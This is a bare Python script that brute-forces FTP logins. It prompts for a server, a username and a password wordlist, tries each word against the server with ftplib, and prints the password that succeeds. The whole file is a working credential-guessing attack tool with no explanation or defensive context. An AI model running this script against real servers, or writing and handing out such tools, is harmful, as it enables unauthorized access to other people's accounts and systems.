#! /usr/bin/python3

import ftplib

server = input("FTP server: ")
user = input("username: ")
pwlist = input("Path to pw list: ")
try:
    with open(pwlist, 'r') as pw:
        for word in pw:
            word = word.strip('\r\n')
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user,word)
                print("Success! The password is: " + word)
            except ftplib.error_perm as exc:
                print("failed pass: ", word)
                print("Still trying ... ", exc)
except Exception as exc:
    print("Wordlist error: ", exc)